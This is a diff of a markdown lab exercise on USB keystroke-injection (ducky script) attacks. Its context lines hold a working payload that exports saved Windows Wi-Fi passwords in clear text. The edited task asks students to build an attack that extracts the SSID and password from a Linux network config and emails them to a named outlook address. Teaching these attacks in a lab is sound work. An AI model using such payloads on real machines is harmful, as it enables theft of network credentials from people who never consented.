@@ -333,10 +333,13 @@ DELAY 500
 STRING cd C:\Users\$env:UserName\Desktop; netsh wlan export profile key=clear; Select-String -Path WiFi-* -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > 0.txt; del WiFi-*;exit
 ENTER
 ```
-**Your job is to first download given configuration file ([download link](misc/networkfile.nmconnection)) on your virtual linux. Use ducky script to come up with an attack that:
+**Your job is to first download given configuration file ([download link](misc/networkfile.nmconnection)) on your virtual linux. Use ducky script to come up with an attack that:**
+
 i) finds the downloaded configuration file 
+
 ii) extracts Wifi password & SSID from it
-iii) exports them over email as plain text.**
+
+iii) sends password & SSID to following email: win10_9121@outlook.com
 
 
 **Recommended way to proceed:**
